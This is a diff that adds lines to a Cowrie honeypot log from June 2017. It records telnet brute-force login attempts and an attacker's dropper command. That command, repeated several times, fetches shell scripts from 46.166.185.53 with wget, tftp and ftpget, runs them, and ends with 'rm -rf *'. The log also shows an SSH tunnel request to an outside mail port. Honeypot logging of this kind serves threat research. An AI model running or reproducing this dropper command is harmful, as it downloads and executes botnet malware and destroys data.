@@ -7534,3 +7534,53 @@
 2017-06-02T15:28:54+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.165.29.46:35118 (10.8.41.81:2223) [session: TT7405]
 2017-06-02T15:28:57+0000 [CowrieTelnetTransport,7400,95.32.202.217] CMD: sh
 2017-06-02T15:28:57+0000 [CowrieTelnetTransport,7400,95.32.202.217] Command found: sh 
+2017-06-02T15:29:02+0000 [CowrieTelnetTransport,7400,95.32.202.217] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.53/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.53 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.53; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.53 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-06-02T15:29:02+0000 [CowrieTelnetTransport,7400,95.32.202.217] Command found: cd /tmp
+2017-06-02T15:29:02+0000 [CowrieTelnetTransport,7400,95.32.202.217] Command found: cd /var/run
+2017-06-02T15:29:02+0000 [CowrieTelnetTransport,7400,95.32.202.217] Command found: cd /mnt
+2017-06-02T15:29:02+0000 [CowrieTelnetTransport,7400,95.32.202.217] Command found: cd /root
+2017-06-02T15:29:02+0000 [CowrieTelnetTransport,7400,95.32.202.217] Command found: cd /
+2017-06-02T15:29:02+0000 [CowrieTelnetTransport,7400,95.32.202.217] Command found: wget http://46.166.185.53/bins.sh
+2017-06-02T15:29:02+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.53/bins.sh>
+2017-06-02T15:29:06+0000 [CowrieTelnetTransport,7401,139.59.230.53] Connection lost after 43 seconds
+2017-06-02T15:29:06+0000 [CowrieTelnetTransport,7404,185.165.29.46] login attempt: 207
+2017-06-02T15:29:06+0000 [CowrieTelnetTransport,7404,185.165.29.46] login return, expect: [admin/5up]
+2017-06-02T15:29:08+0000 [CowrieTelnetTransport,7404,185.165.29.46] login attempt [Administrator/] failed
+2017-06-02T15:29:08+0000 [CowrieTelnetTransport,7404,185.165.29.46] Warning: state changed and new state returned
+2017-06-02T15:29:08+0000 [CowrieTelnetTransport,7400,95.32.202.217] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.53/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.53 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.53; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.53 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-06-02T15:29:08+0000 [CowrieTelnetTransport,7390,221.9.136.69] Closing TTY Log: log/tty/20170602-152630-None-7390i.log after 158 seconds
+2017-06-02T15:29:08+0000 [CowrieTelnetTransport,7390,221.9.136.69] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-02T15:29:08+0000 [CowrieTelnetTransport,7390,221.9.136.69] Connection lost after 185 seconds
+2017-06-02T15:29:11+0000 [CowrieTelnetTransport,7400,95.32.202.217] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.53/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.53 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.53; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.53 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-06-02T15:29:11+0000 [CowrieTelnetTransport,7400,95.32.202.217] Closing TTY Log: log/tty/20170602-152838-None-7400i.log after 33 seconds
+2017-06-02T15:29:11+0000 [CowrieTelnetTransport,7400,95.32.202.217] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-06-02T15:29:11+0000 [CowrieTelnetTransport,7400,95.32.202.217] Connection lost after 70 seconds
+2017-06-02T15:29:12+0000 [CowrieTelnetTransport,7404,185.165.29.46] login attempt: 208
+2017-06-02T15:29:12+0000 [CowrieTelnetTransport,7404,185.165.29.46] login return, expect: [admin/5up]
+2017-06-02T15:29:14+0000 [CowrieTelnetTransport,7404,185.165.29.46] login attempt [enable/shell] failed
+2017-06-02T15:29:14+0000 [CowrieTelnetTransport,7404,185.165.29.46] Warning: state changed and new state returned
+2017-06-02T15:29:15+0000 [CowrieTelnetTransport,7405,185.165.29.46] login attempt: 209
+2017-06-02T15:29:15+0000 [CowrieTelnetTransport,7405,185.165.29.46] login return, expect: [admin/5up]
+2017-06-02T15:29:17+0000 [CowrieTelnetTransport,7405,185.165.29.46] login attempt [default/] failed
+2017-06-02T15:29:17+0000 [CowrieTelnetTransport,7405,185.165.29.46] Warning: state changed and new state returned
+2017-06-02T15:29:17+0000 [CowrieTelnetTransport,7404,185.165.29.46] login attempt: 210
+2017-06-02T15:29:17+0000 [CowrieTelnetTransport,7404,185.165.29.46] login return, expect: [admin/5up]
+2017-06-02T15:29:19+0000 [CowrieTelnetTransport,7404,185.165.29.46] login attempt [sh//bin/busybox ECCHI] failed
+2017-06-02T15:29:19+0000 [CowrieTelnetTransport,7404,185.165.29.46] Warning: state changed and new state returned
+2017-06-02T15:29:21+0000 [CowrieTelnetTransport,7405,185.165.29.46] login attempt: 211
+2017-06-02T15:29:21+0000 [CowrieTelnetTransport,7405,185.165.29.46] login return, expect: [admin/5up]
+2017-06-02T15:29:22+0000 [CowrieTelnetTransport,7405,185.165.29.46] login attempt [enable/shell] failed
+2017-06-02T15:29:22+0000 [CowrieTelnetTransport,7405,185.165.29.46] Warning: state changed and new state returned
+2017-06-02T15:29:23+0000 [CowrieTelnetTransport,7405,185.165.29.46] login attempt: 212
+2017-06-02T15:29:23+0000 [CowrieTelnetTransport,7405,185.165.29.46] login return, expect: [admin/5up]
+2017-06-02T15:29:24+0000 [CowrieTelnetTransport,7405,185.165.29.46] login attempt [sh//bin/busybox ECCHI] failed
+2017-06-02T15:29:24+0000 [CowrieTelnetTransport,7405,185.165.29.46] Warning: state changed and new state returned
+2017-06-02T15:29:32+0000 [-] Connection was probably lost. Could not write to terminal
+2017-06-02T15:29:32+0000 [-] Connection was probably lost. Could not write to terminal
+2017-06-02T15:29:32+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.53/bins.sh>
+2017-06-02T15:29:52+0000 [CowrieTelnetTransport,7404,185.165.29.46] Connection lost after 67 seconds
+2017-06-02T15:29:57+0000 [CowrieTelnetTransport,7405,185.165.29.46] Connection lost after 62 seconds
+2017-06-02T15:29:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1957,91.195.103.205] got channel 'direct-tcpip' request
+2017-06-02T15:29:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1957,91.195.103.205] direct-tcp connection request to 107.14.166.72:587 from localhost:5556
